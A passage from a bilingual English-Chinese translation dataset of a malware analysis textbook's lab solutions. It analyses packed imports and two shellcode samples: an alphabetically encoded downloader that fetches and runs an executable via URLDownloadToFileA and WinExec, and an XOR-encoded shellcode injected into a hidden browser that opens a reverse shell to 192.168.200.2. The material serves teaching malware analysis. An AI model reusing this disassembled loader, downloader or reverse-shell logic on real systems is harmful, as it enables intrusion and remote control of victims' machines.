  id: totrans-6450
  prefs: []
  type: TYPE_NORMAL
  zh: 00404000 dword_404000 dd 77E371E9h
- en: 00404004 dword_404004 dd 77E37EB1h
  id: totrans-6451
  prefs: []
  type: TYPE_NORMAL
  zh: 00404004 dword_404004 dd 77E37EB1h
- en: 00404008 dword_404008 dd 77DF697Eh
  id: totrans-6452
  prefs: []
  type: TYPE_NORMAL
  zh: 00404008 dword_404008 dd 77DF697Eh
- en: 0040400C align 10h
  id: totrans-6453
  prefs: []
  type: TYPE_NORMAL
  zh: 0040400C align 10h
- en: 00404010 dword_404010 dd 7C862AC1h
  id: totrans-6454
  prefs: []
  type: TYPE_NORMAL
  zh: 00404010 dword_404010 dd 7C862AC1h
- en: 00404014 dword_404014 dd 7C810BACh
  id: totrans-6455
  prefs: []
  type: TYPE_NORMAL
  zh: 00404014 dword_404014 dd 7C810BACh
- en: '*Listing 18-15L: Imported functions that have not been recognized by IDA Pro*
    To make the unpacked code easier to analyze, we turn to OllyDbg to find out which
    function is stored at those locations. The easiest way to identify which imported
    function is stored at a given address in OllyDbg is to change the value of any
    register to the address you want to look up. For example, to identify the imported
    function stored at dword_404004, double-click eax and enter the value **0x77E37EB1**.
    We see that OllyDbg labels the address as Advapi32.StartServiceCtrlDispatcherA.
    We can rename the DWORD address in IDA Pro to StartServiceCtrlDispatcherA. Now
    whenever the malware calls the **1 8**'
  id: totrans-6456
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 18-15L：IDA Pro 未识别的导入函数* 为了使解包代码更容易分析，我们转向 OllyDbg 以找出哪些函数存储在这些位置。在 OllyDbg
    中识别存储在给定地址的导入函数的最简单方法是更改任何寄存器的值为您要查找的地址。例如，要识别存储在 dword_404004 的导入函数，双击 eax 并输入值
    **0x77E37EB1**。我们看到 OllyDbg 将地址标记为 Advapi32.StartServiceCtrlDispatcherA。我们可以在
    IDA Pro 中将 DWORD 地址重命名为 StartServiceCtrlDispatcherA。现在每当恶意软件调用 **1 8**'
- en: recently renamed address, it will be labeled as StartServiceCtrlDispatcherA,
    instead of dword_404004\.
  id: totrans-6457
  prefs: []
  type: TYPE_NORMAL
  zh: 最近重命名的地址，它将被标记为 StartServiceCtrlDispatcherA，而不是 dword_404004\.
- en: We can repeat this process for each imported function, and then we will have
    a program that we can analyze in IDA Pro as if it were never packed. We still
    have not created a working version of the unpacked file, but it doesn’t really
    matter, because we can analyze the file without it. Looking at the file, we can
    tell that this is the same as *Lab07-01.exe*.
  id: totrans-6458
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以为每个导入函数重复此过程，然后我们将有一个可以在 IDA Pro 中分析的程序，就像它从未打包过一样。我们还没有创建解包文件的可用版本，但这并不重要，因为我们可以在没有它的情况下分析文件。查看文件，我们可以看出这与
    *Lab07-01.exe* 相同。
- en: Solutions to Labs
  id: totrans-6459
  prefs: []
  type: TYPE_NORMAL
  zh: 实验解答
- en: '**695**'
  id: totrans-6460
  prefs: []
  type: TYPE_NORMAL
  zh: '**695**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-6461
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**Lab 19-1 Solutions**'
  id: totrans-6462
  prefs: []
  type: TYPE_NORMAL
  zh: '**实验 19-1 解答**'
- en: '***Short Answers***'
  id: totrans-6463
  prefs: []
  type: TYPE_NORMAL
  zh: '***简短答案***'
- en: 1\.
  id: totrans-6464
  prefs: []
  type: TYPE_NORMAL
  zh: '1.'
- en: The shellcode is stored with an alphabetic encoding; each payload byte is stored
    in the low nibble of two encoded bytes.
  id: totrans-6465
  prefs: []
  type: TYPE_NORMAL
  zh: Shellcode 使用字母编码存储；每个有效载荷字节存储在两个编码字节的低四位中。
- en: 2\.
  id: totrans-6466
  prefs: []
  type: TYPE_NORMAL
  zh: '2.'
- en: 'The shellcode resolves the following functions:'
  id: totrans-6467
  prefs: []
  type: TYPE_NORMAL
  zh: Shellcode 解析以下函数：
- en: 
  id: totrans-6468
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: LoadLibraryA
  id: totrans-6469
  prefs: []
  type: TYPE_NORMAL
  zh: LoadLibraryA
- en: 
  id: totrans-6470
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: GetSystemDirectoryA
  id: totrans-6471
  prefs: []
  type: TYPE_NORMAL
  zh: GetSystemDirectoryA
- en: 
  id: totrans-6472
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: TerminateProcess
  id: totrans-6473
  prefs: []
  type: TYPE_NORMAL
  zh: TerminateProcess
- en: 
  id: totrans-6474
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: GetCurrentProcess
  id: totrans-6475
  prefs: []
  type: TYPE_NORMAL
  zh: GetCurrentProcess
- en: 
  id: totrans-6476
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: WinExec
  id: totrans-6477
  prefs: []
  type: TYPE_NORMAL
  zh: WinExec
- en: 
  id: totrans-6478
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: URLDownloadToFileA
  id: totrans-6479
  prefs: []
  type: TYPE_NORMAL
  zh: URLDownloadToFileA
- en: 3\.
  id: totrans-6480
  prefs: []
  type: TYPE_NORMAL
  zh: '3.'
- en: 'The shellcode downloads this URL:'
  id: totrans-6481
  prefs: []
  type: TYPE_NORMAL
  zh: Shellcode 下载以下 URL：
- en: '*http://www.practicalmalwareanalysis.com/shellcode/annoy_user.exe* 4\.'
  id: totrans-6482
  prefs: []
  type: TYPE_NORMAL
  zh: '*http://www.practicalmalwareanalysis.com/shellcode/annoy_user.exe* 4.'
- en: The shellcode writes *%SystemRoot%\System32\1.exe* and executes it.
  id: totrans-6483
  prefs: []
  type: TYPE_NORMAL
  zh: Shellcode 将 *%SystemRoot%\System32\1.exe* 写入磁盘并执行它。
- en: 5\.
  id: totrans-6484
  prefs: []
  type: TYPE_NORMAL
  zh: '5.'
- en: The shellcode downloads a file from a URL stored within the encoded payload,
    writes it to disk, and executes it.
  id: totrans-6485
  prefs: []
  type: TYPE_NORMAL
  zh: Shellcode 从编码有效载荷中存储的 URL 下载文件，将其写入磁盘并执行它。
- en: '***Detailed Analysis***'
  id: totrans-6486
  prefs: []
  type: TYPE_NORMAL
  zh: '***详细分析***'
- en: 'You can perform dynamic analysis with the *shellcode_launcher.exe* utility
    with the following command line:'
  id: totrans-6487
  prefs: []
  type: TYPE_NORMAL
  zh: 您可以使用 *shellcode_launcher.exe* 工具执行以下命令行进行动态分析：
- en: shellcode_launcher.exe –i Lab19-01.bin -bp
  id: totrans-6488
  prefs: []
  type: TYPE_NORMAL
  zh: shellcode_launcher.exe –i Lab19-01.bin -bp
- en: The –bp option causes the program to execute a breakpoint instruction just prior
    to jumping to the shellcode buffer. If the system is configured with a just-in-time
    debugger, the breakpoint instruction will cause *shellcode_launcher.exe* to be
    loaded by the debugger (as discussed in Chapter 19). You can set OllyDbg as your
    just-in-time debugger by selecting **Options****Just-in-Time Debugging****Make
    OllyDbg Just-in-Time Debugger**.
  id: totrans-6489
  prefs: []
  type: TYPE_NORMAL
  zh: –bp 选项会在跳转到 Shellcode 缓冲区之前使程序执行断点指令。如果系统配置了即时调试器，断点指令将导致 *shellcode_launcher.exe*
    被调试器加载（如第 19 章所述）。您可以通过选择 **选项****即时调试****将 OllyDbg 设置为即时调试器** 来将 OllyDbg 设置为您的即时调试器。
- en: If you do not set a just-in-time debugger, you can still run the program by
    specifying the *shellcode_launcher.exe* program as the executable to debug, but
    you must also be sure to provide the program arguments as well.
  id: totrans-6490
  prefs: []
  type: TYPE_NORMAL
  zh: 如果您没有设置即时调试器，您仍然可以通过指定 *shellcode_launcher.exe* 程序作为要调试的可执行文件来运行程序，但您还必须确保提供程序参数。
- en: The shellcode decoder starts at  in Listing 19-1L. It uses an alphabetic encoding
    with each encoded byte between 0x41 ( *A*) and 0x50 ( *P*). Each payload byte
    is stored in the low 4-bit nibble of two encoded bytes. The decoder loads each
    pair of encoded bytes, subtracts the base value 0x41, shifts and adds the two
    values, and stores the value back to memory. The push shown at  is used to transfer
    control to the payload with the retn at .
  id: totrans-6491
  prefs: []
  type: TYPE_NORMAL
  zh: Shellcode 解码器从列表 19-1L 中的处开始。它使用字母编码，每个编码字节介于 0x41 ( *A*) 和 0x50 ( *P*) 之间。每个有效载荷字节存储在两个编码字节的低
    4 位四分位中。解码器加载每一对编码字节，减去基本值 0x41，然后对两个值进行移位和加法，并将值存储回内存。显示处的 push 用于将控制权转移到带有
    retn at 的有效载荷。
- en: 00000200 xor ecx, ecx 
  id: totrans-6492
  prefs: []
  type: TYPE_NORMAL
  zh: 00000200 xor ecx, ecx 
- en: 00000202 mov cx, 18Dh
  id: totrans-6493
  prefs: []
  type: TYPE_NORMAL
  zh: 00000202 mov cx, 18Dh
- en: 00000206 jmp short loc_21F
  id: totrans-6494
  prefs: []
  type: TYPE_NORMAL
  zh: 00000206 jmp short loc_21F
- en: '**696**'
  id: totrans-6495
  prefs: []
  type: TYPE_NORMAL
  zh: '**696**'
- en: Appendix C
  id: totrans-6496
  prefs: []
  type: TYPE_NORMAL
  zh: 附录 C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-6497
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 00000208
  id: totrans-6498
  prefs: []
  type: TYPE_NORMAL
  zh: 00000208
- en: 00000208 pop esi
  id: totrans-6499
  prefs: []
  type: TYPE_NORMAL
  zh: 00000208 pop esi
- en: 00000209 push esi 
  id: totrans-6500
  prefs: []
  type: TYPE_NORMAL
  zh: 00000209 push esi 
- en: 0000020A mov edi, esi
  id: totrans-6501
  prefs: []
  type: TYPE_NORMAL
  zh: 0000020A mov edi, esi
- en: '0000020C loc_20C:'
  id: totrans-6502
  prefs: []
  type: TYPE_NORMAL
  zh: '0000020C loc_20C:'
- en: 0000020C lodsb
  id: totrans-6503
  prefs: []
  type: TYPE_NORMAL
  zh: 0000020C lodsb
- en: 0000020D mov dl, al
  id: totrans-6504
  prefs: []
  type: TYPE_NORMAL
  zh: 0000020D mov dl, al
- en: 0000020F sub dl, 41h ; 'A'
  id: totrans-6505
  prefs: []
  type: TYPE_NORMAL
  zh: 0000020F sub dl, 41h ; 'A'
- en: 00000212 shl dl, 4
  id: totrans-6506
  prefs: []
  type: TYPE_NORMAL
  zh: 00000212 shl dl, 4
- en: 00000215 lodsb
  id: totrans-6507
  prefs: []
  type: TYPE_NORMAL
  zh: 00000215 lodsb
- en: 00000216 sub al, 41h ; 'A'
  id: totrans-6508
  prefs: []
  type: TYPE_NORMAL
  zh: 00000216 sub al, 41h ; 'A'
- en: 00000218 add al, dl
  id: totrans-6509
  prefs: []
  type: TYPE_NORMAL
  zh: 00000218 add al, dl
- en: 0000021A stosb
  id: totrans-6510
  prefs: []
  type: TYPE_NORMAL
  zh: 0000021A stosb
- en: 0000021B dec ecx
  id: totrans-6511
  prefs: []
  type: TYPE_NORMAL
  zh: 0000021B dec ecx
- en: 0000021C jnz short loc_20C
  id: totrans-6512
  prefs: []
  type: TYPE_NORMAL
  zh: 0000021C jnz short loc_20C
- en: 0000021E retn 
  id: totrans-6513
  prefs: []
  type: TYPE_NORMAL
  zh: 0000021E retn 
- en: '0000021F loc_21F:'
  id: totrans-6514
  prefs: []
  type: TYPE_NORMAL
  zh: '0000021F loc_21F:'
- en: 0000021F call sub_208
  id: totrans-6515
  prefs: []
  type: TYPE_NORMAL
  zh: 0000021F call sub_208
- en: '*Listing 19-1L: Shellcode decoder with alphabetic encoding* The start of the
    decoded payload begins at offset 0x224, where the code again performs a call/pop
    pair to obtain a pointer to data stored at the end of the payload. Two strings
    are stored here: URLMON and the URL http://'
  id: totrans-6516
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 19-1L：具有字母编码的 Shellcode 解码器* 解码后的有效载荷的开始在偏移量 0x224 处，其中代码再次执行一个 call/pop
    对，以获取存储在有效载荷末尾的数据的指针。这里存储了两个字符串：URLMON 和 URL http://'
- en: www.practicalmalwareanalysis.com/shellcode/annoy_user.exe.
  id: totrans-6517
  prefs: []
  type: TYPE_NORMAL
  zh: www.practicalmalwareanalysis.com/shellcode/annoy_user.exe.
- en: The shellcode uses the same findKernel32Base and findSymbolByHash functions
    described in Chapter 19 to manually resolve import functions. The findKernel32Base
    function returns the location of *kernel32.dll* in memory, and the findSymbolByHash
    function manually parses the provided DLL in memory, looking for the export symbol
    whose name hashes to the given DWORD value.
  id: totrans-6518
  prefs: []
  type: TYPE_NORMAL
  zh: Shellcode 使用第 19 章中描述的相同的 findKernel32Base 和 findSymbolByHash 函数手动解析导入函数。findKernel32Base
    函数返回内存中 *kernel32.dll* 的位置，而 findSymbolByHash 函数手动解析提供的 DLL，在内存中查找名称哈希值为给定 DWORD
    值的导出符号。
- en: These function pointers are stored back onto the stack for use later. Listing
    19-2L shows the decoded shellcode searching for function imports.
  id: totrans-6519
  prefs: []
  type: TYPE_NORMAL
  zh: 这些函数指针被存储回堆栈以供以后使用。列表 19-2L 显示了解码后的 shellcode 搜索函数导入。
- en: 000002BF pop ebx
  id: totrans-6520
  prefs: []
  type: TYPE_NORMAL
  zh: 000002BF pop ebx
- en: 000002C0 call findKernel32Base
  id: totrans-6521
  prefs: []
  type: TYPE_NORMAL
  zh: 000002C0 call findKernel32Base
- en: 000002C5 mov edx, eax
  id: totrans-6522
  prefs: []
  type: TYPE_NORMAL
  zh: 000002C5 mov edx, eax
- en: 000002C7 push 0EC0E4E8Eh ; kernel32.dll:LoadLibraryA 000002CC push edx
  id: totrans-6523
  prefs: []
  type: TYPE_NORMAL
  zh: 000002C7 push 0EC0E4E8Eh ; kernel32.dll:LoadLibraryA 000002CC push edx
- en: 000002CD call findSymbolByHash
  id: totrans-6524
  prefs: []
  type: TYPE_NORMAL
  zh: 000002CD call findSymbolByHash
- en: 000002D2 mov [ebp-4], eax
  id: totrans-6525
  prefs: []
  type: TYPE_NORMAL
  zh: 000002D2 mov [ebp-4], eax
- en: 000002D5 push 0B8E579C1h ; kernel32.dll:GetSystemDirectoryA 000002DA push edx
  id: totrans-6526
  prefs: []
  type: TYPE_NORMAL
  zh: 000002D5 push 0B8E579C1h ; kernel32.dll:GetSystemDirectoryA 000002DA push edx
- en: 000002DB call findSymbolByHash
  id: totrans-6527
  prefs: []
  type: TYPE_NORMAL
  zh: 000002DB call findSymbolByHash
- en: 000002E0 mov [ebp-8], eax
  id: totrans-6528
  prefs: []
  type: TYPE_NORMAL
  zh: 000002E0 mov [ebp-8], eax
- en: 000002E3 push 78B5B983h ; kernel32.dll:TerminateProcess **1 9**
  id: totrans-6529
  prefs: []
  type: TYPE_NORMAL
  zh: 000002E3 push 78B5B983h ; kernel32.dll:TerminateProcess **1 9**
- en: 000002E8 push edx
  id: totrans-6530
  prefs: []
  type: TYPE_NORMAL
  zh: 000002E8 push edx
- en: 000002E9 call findSymbolByHash
  id: totrans-6531
  prefs: []
  type: TYPE_NORMAL
  zh: 000002E9 call findSymbolByHash
- en: 000002EE mov [ebp-0Ch], eax
  id: totrans-6532
  prefs: []
  type: TYPE_NORMAL
  zh: 000002EE mov [ebp-0Ch], eax
- en: 000002F1 push 7B8F17E6h ; kernel32.dll:GetCurrentProcess 000002F6 push edx
  id: totrans-6533
  prefs: []
  type: TYPE_NORMAL
  zh: 000002F1 push 7B8F17E6h ; kernel32.dll:GetCurrentProcess 000002F6 push edx
- en: 000002F7 call findSymbolByHash
  id: totrans-6534
  prefs: []
  type: TYPE_NORMAL
  zh: 000002F7 call findSymbolByHash
- en: 000002FC mov [ebp-10h], eax
  id: totrans-6535
  prefs: []
  type: TYPE_NORMAL
  zh: 000002FC mov [ebp-10h], eax
- en: Solutions to Labs
  id: totrans-6536
  prefs: []
  type: TYPE_NORMAL
  zh: 解决实验室问题
- en: '**697**'
  id: totrans-6537
  prefs: []
  type: TYPE_NORMAL
  zh: '**697**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-6538
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 000002FF push 0E8AFE98h ; kernel32.dll:WinExec 00000304 push edx
  id: totrans-6539
  prefs: []
  type: TYPE_NORMAL
  zh: 000002FF push 0E8AFE98h ; kernel32.dll:WinExec 00000304 push edx
- en: 00000305 call findSymbolByHash
  id: totrans-6540
  prefs: []
  type: TYPE_NORMAL
  zh: 00000305 call findSymbolByHash
- en: 0000030A mov [ebp-14h], eax
  id: totrans-6541
  prefs: []
  type: TYPE_NORMAL
  zh: 0000030A mov [ebp-14h], eax
- en: 0000030D lea eax, [ebx]
  id: totrans-6542
  prefs: []
  type: TYPE_NORMAL
  zh: 0000030D lea eax, [ebx]
- en: 0000030F push eax
  id: totrans-6543
  prefs: []
  type: TYPE_NORMAL
  zh: 0000030F push eax
- en: 00000310 call dword ptr [ebp-4] ; LoadLibraryA
  id: totrans-6544
  prefs: []
  type: TYPE_NORMAL
  zh: 00000310 call dword ptr [ebp-4] ; LoadLibraryA
- en: 00000313 push 702F1A36h ; urlmon.dll:URLDownloadToFileA 00000318 push eax
  id: totrans-6545
  prefs: []
  type: TYPE_NORMAL
  zh: 00000313 push 702F1A36h ; urlmon.dll:URLDownloadToFileA 00000318 push eax
- en: 00000319 call findSymbolByHash
  id: totrans-6546
  prefs: []
  type: TYPE_NORMAL
  zh: 00000319 call findSymbolByHash
- en: '*Listing 19-2L: Shellcode resolving imports*'
  id: totrans-6547
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 19-2L：Shellcode 解析导入*'
- en: Listing 19-3L shows the main functionality of the shellcode. The malware retrieves
    the system directory at , and then appends the string 1.exe at .
  id: totrans-6548
  prefs: []
  type: TYPE_NORMAL
  zh: 列表 19-3L 显示了 shellcode 的主要功能。恶意软件检索系统目录在处，然后附加字符串 1.exe 在处。
- en: This is used as the local filesystem path argument to URLDownloadToFileA called
    at . This function is commonly found in shellcode. One function call performs
    an HTTP GET to the URL the code specifies and stores it at the specified file
    path. Here, the URL is the string stored at the end of the decoded shellcode.
    Finally, the shellcode executes the downloaded file at  before cleanly exiting.
  id: totrans-6549
  prefs: []
  type: TYPE_NORMAL
  zh: 这被用作在处调用的URLDownloadToFileA的本地文件系统路径参数。该函数通常在脚本代码中找到。一个函数调用执行对代码指定的URL的HTTP
    GET操作，并将其存储在指定的文件路径中。在这里，URL是解码后的脚本代码末尾存储的字符串。最后，脚本代码在处执行下载的文件，然后干净地退出。
- en: 0000031E mov [ebp-18h], eax
  id: totrans-6550
  prefs: []
  type: TYPE_NORMAL
  zh: 0000031E mov [ebp-18h], eax
- en: 00000321 push 80h
  id: totrans-6551
  prefs: []
  type: TYPE_NORMAL
  zh: 00000321 push 80h
- en: 00000326 lea edi, [ebx+48h]
  id: totrans-6552
  prefs: []
  type: TYPE_NORMAL
  zh: 00000326 lea edi, [ebx+48h]
- en: 00000329 push edi
  id: totrans-6553
  prefs: []
  type: TYPE_NORMAL
  zh: 00000329 push edi
- en: 0000032A call dword ptr [ebp-8] ; GetSystemDirectoryA 
  id: totrans-6554
  prefs: []
  type: TYPE_NORMAL
  zh: 0000032A call dword ptr [ebp-8] ; GetSystemDirectoryA 
- en: 0000032D add edi, eax
  id: totrans-6555
  prefs: []
  type: TYPE_NORMAL
  zh: 0000032D add edi, eax
- en: 0000032F mov dword ptr [edi], 652E315Ch ; "\\1.e" 
  id: totrans-6556
  prefs: []
  type: TYPE_NORMAL
  zh: 0000032F mov dword ptr [edi], 652E315Ch ; "\\1.e" 
- en: 00000335 mov dword ptr [edi+4], 6578h ; "xe\x00"
  id: totrans-6557
  prefs: []
  type: TYPE_NORMAL
  zh: 00000335 mov dword ptr [edi+4], 6578h ; "xe\x00"
- en: 0000033C xor ecx, ecx
  id: totrans-6558
  prefs: []
  type: TYPE_NORMAL
  zh: 0000033C xor ecx, ecx
- en: 0000033E push ecx
  id: totrans-6559
  prefs: []
  type: TYPE_NORMAL
  zh: 0000033E push ecx
- en: 0000033F push ecx
  id: totrans-6560
  prefs: []
  type: TYPE_NORMAL
  zh: 0000033F push ecx
- en: 00000340 lea eax, [ebx+48h]
  id: totrans-6561
  prefs: []
  type: TYPE_NORMAL
  zh: 00000340 lea eax, [ebx+48h]
- en: 00000343 push eax ; localFileSystemPath 00000344 lea eax, [ebx+7]
  id: totrans-6562
  prefs: []
  type: TYPE_NORMAL
  zh: 00000343 push eax ; localFileSystemPath 00000344 lea eax, [ebx+7]
- en: 00000347 push eax ; URL to download
  id: totrans-6563
  prefs: []
  type: TYPE_NORMAL
  zh: 00000347 push eax ; URL to download
- en: 00000348 push ecx
  id: totrans-6564
  prefs: []
  type: TYPE_NORMAL
  zh: 00000348 push ecx
- en: 00000349 call dword ptr [ebp-18h] ; URLDownloadToFileA 
  id: totrans-6565
  prefs: []
  type: TYPE_NORMAL
  zh: 00000349 call dword ptr [ebp-18h] ; URLDownloadToFileA 
- en: 0000034C push 5
  id: totrans-6566
  prefs: []
  type: TYPE_NORMAL
  zh: 0000034C push 5
- en: 00000351 lea eax, [ebx+48h] ; path to executable 00000354 push eax
  id: totrans-6567
  prefs: []
  type: TYPE_NORMAL
  zh: 00000351 lea eax, [ebx+48h] ; path to executable 00000354 push eax
- en: 00000355 call dword ptr [ebp-14h] ; WinExec 
  id: totrans-6568
  prefs: []
  type: TYPE_NORMAL
  zh: 00000355 call dword ptr [ebp-14h] ; WinExec 
- en: 00000358 call dword ptr [ebp-10h] ; GetCurrentProcess 0000035B push 0
  id: totrans-6569
  prefs: []
  type: TYPE_NORMAL
  zh: 00000358 call dword ptr [ebp-10h] ; GetCurrentProcess 0000035B push 0
- en: 00000360 push eax
  id: totrans-6570
  prefs: []
  type: TYPE_NORMAL
  zh: 00000360 push eax
- en: '00000361 call dword ptr [ebp-0Ch] ; TerminateProcess *Listing 19-3L: Shellcode
    payload*'
  id: totrans-6571
  prefs: []
  type: TYPE_NORMAL
  zh: '00000361 call dword ptr [ebp-0Ch] ; TerminateProcess *Listing 19-3L: Shellcode
    payload*'
- en: '**698**'
  id: totrans-6572
  prefs: []
  type: TYPE_NORMAL
  zh: '**698**'
- en: Appendix C
  id: totrans-6573
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-6574
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**Lab 19-2 Solutions**'
  id: totrans-6575
  prefs: []
  type: TYPE_NORMAL
  zh: '**Lab 19-2 Solutions**'
- en: '***Short Answers***'
  id: totrans-6576
  prefs: []
  type: TYPE_NORMAL
  zh: '***Short Answers***'
- en: 1\.
  id: totrans-6577
  prefs: []
  type: TYPE_NORMAL
  zh: 1\.
- en: The program process-injects the default web browser, Internet Explorer.
  id: totrans-6578
  prefs: []
  type: TYPE_NORMAL
  zh: 程序将默认网络浏览器，即Internet Explorer，注入进程。
- en: 2\.
  id: totrans-6579
  prefs: []
  type: TYPE_NORMAL
  zh: 2\.
- en: The shellcode buffer is located at 0x407030\.
  id: totrans-6580
  prefs: []
  type: TYPE_NORMAL
  zh: 脚本代码缓冲区位于0x407030\.
- en: 3\.
  id: totrans-6581
  prefs: []
  type: TYPE_NORMAL
  zh: 3\.
- en: The shellcode is XOR’ed with the byte 0xe7\.
  id: totrans-6582
  prefs: []
  type: TYPE_NORMAL
  zh: 脚本代码与字节0xe7进行XOR运算。
- en: 4\.
  id: totrans-6583
  prefs: []
  type: TYPE_NORMAL
  zh: 4\.
- en: 'The shellcode manually imports the following functions:'
  id: totrans-6584
  prefs: []
  type: TYPE_NORMAL
  zh: 脚本代码手动导入以下函数：
- en: 
  id: totrans-6585
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: LoadLibraryA
  id: totrans-6586
  prefs: []
  type: TYPE_NORMAL
  zh: LoadLibraryA
- en: 
  id: totrans-6587
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: CreateProcessA
  id: totrans-6588
  prefs: []
  type: TYPE_NORMAL
  zh: CreateProcessA
- en: 
  id: totrans-6589
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: TerminateProcess
  id: totrans-6590
  prefs: []
  type: TYPE_NORMAL
  zh: TerminateProcess
- en: 
  id: totrans-6591
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: GetCurrentProcess
  id: totrans-6592
  prefs: []
  type: TYPE_NORMAL
  zh: GetCurrentProcess
- en: 
  id: totrans-6593
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: WSAStartup
  id: totrans-6594
  prefs: []
  type: TYPE_NORMAL
  zh: WSAStartup
- en: 
  id: totrans-6595
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: WSASocketA
  id: totrans-6596
  prefs: []
  type: TYPE_NORMAL
  zh: WSASocketA
- en: 
  id: totrans-6597
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: connect
  id: totrans-6598
  prefs: []
  type: TYPE_NORMAL
  zh: connect
- en: 5\.
  id: totrans-6599
  prefs: []
  type: TYPE_NORMAL
  zh: 5\.
- en: The shellcode connects to IP 192.168.200.2 on TCP port 13330\.
  id: totrans-6600
  prefs: []
  type: TYPE_NORMAL
  zh: 脚本代码连接到IP 192.168.200.2上的TCP端口13330\.
- en: 6\.
  id: totrans-6601
  prefs: []
  type: TYPE_NORMAL
  zh: 6\.
- en: The shellcode provides a remote shell ( *cmd.exe*).
  id: totrans-6602
  prefs: []
  type: TYPE_NORMAL
  zh: 脚本代码提供了一个远程shell（ *cmd.exe*）。
- en: '***Detailed Analysis***'
  id: totrans-6603
  prefs: []
  type: TYPE_NORMAL
  zh: '***Detailed Analysis***'
- en: The malware starts by determining the default web browser by reading the registry
    value HKCR\http\shell\open\command. The browser is created as a new process whose
    StartupInfo.wShowWindow value is set to SW_HIDE, so the process is hidden from
    the user interface. Process-injecting the default web browser is a common malware
    trick because it is normal for the web browser to perform network communications.
  id: totrans-6604
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件首先通过读取注册表值 HKCR\http\shell\open\command 来确定默认网络浏览器。浏览器作为一个新进程被创建，其StartupInfo.wShowWindow值被设置为SW_HIDE，因此进程在用户界面中不可见。将默认网络浏览器注入进程是恶意软件的常见技巧，因为网络浏览器执行网络通信是正常的。
- en: 'The following functions are used by the process as part of the injection:'
  id: totrans-6605
  prefs: []
  type: TYPE_NORMAL
  zh: 进程作为注入的一部分使用了以下函数：
- en: 
  id: totrans-6606
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: The function at 0x4010b0 gives the current process proper privileges to allow
    debugging.
  id: totrans-6607
  prefs: []
  type: TYPE_NORMAL
  zh: 0x4010b0地址处的函数赋予当前进程适当的权限以允许调试。
- en: 
  id: totrans-6608
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: The function at 0x401000 gets the path to the default web browser from the register.
  id: totrans-6609
  prefs: []
  type: TYPE_NORMAL
  zh: 0x401000地址处的函数从寄存器中获取默认网络浏览器的路径。
- en: 
  id: totrans-6610
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: The function at 0x401180 creates a new process, whose window is hidden in the
    GUI.
  id: totrans-6611
  prefs: []
  type: TYPE_NORMAL
  zh: 0x401180地址处的函数创建一个新的进程，其窗口在GUI中隐藏。
- en: The shellcode buffer is located at 0x407030\. Because the shellcode is capable
    of bootstrapping itself, dynamic analysis can be easily performed by opening the
    *Lab19-02.exe* program in OllyDbg and setting the origin to the start of the shellcode
    buffer. Just remember that the shellcode is designed to **1 9**
  id: totrans-6612
  prefs: []
  type: TYPE_NORMAL
  zh: 脚本代码缓冲区位于0x407030\. 因为脚本代码能够自我引导，所以可以通过在OllyDbg中打开*Lab19-02.exe*程序并将原点设置为脚本代码缓冲区的开始来轻松进行动态分析。只需记住，脚本代码被设计为**1
    9**
- en: execute within the web browser after it is process-injected, but it can be easier
    to perform dynamic analysis in the context of the *Lab19-02.exe* program.
  id: totrans-6613
  prefs: []
  type: TYPE_NORMAL
  zh: 在将其注入处理之后在网页浏览器中执行，但在*Lab19-02.exe*程序上下文中进行动态分析可能更容易。
- en: Solutions to Labs
  id: totrans-6614
  prefs: []
  type: TYPE_NORMAL
  zh: 实验解决方案
- en: '**699**'
  id: totrans-6615
  prefs: []
  type: TYPE_NORMAL
  zh: '**699**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-6616
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: This shellcode is encoded with a single-byte XOR scheme. As shown in Listing
    19-4L, 0x18f bytes are XOR’ed with the value 0xe7 at .
  id: totrans-6617
  prefs: []
  type: TYPE_NORMAL
  zh: 此shellcode使用单字节XOR方案进行编码。如列表19-4L所示，0x18f字节与值0xe7在处进行XOR操作。
- en: 00407032 pop edi
  id: totrans-6618
  prefs: []
  type: TYPE_NORMAL
  zh: 00407032 pop edi
- en: 00407033 push small 18Fh
  id: totrans-6619
  prefs: []
  type: TYPE_NORMAL
  zh: 00407033 push small 18Fh
- en: 00407037 pop cx
  id: totrans-6620
  prefs: []
  type: TYPE_NORMAL
  zh: 00407037 pop cx
- en: 00407039 mov al, 0E7h
  id: totrans-6621
  prefs: []
  type: TYPE_NORMAL
  zh: 00407039 mov al, 0E7h
- en: '0040703B loc_40703B:'
  id: totrans-6622
  prefs: []
  type: TYPE_NORMAL
  zh: '0040703B loc_40703B:'
- en: 0040703B xor [edi], al 
  id: totrans-6623
  prefs: []
  type: TYPE_NORMAL
  zh: 0040703B xor [edi], al 
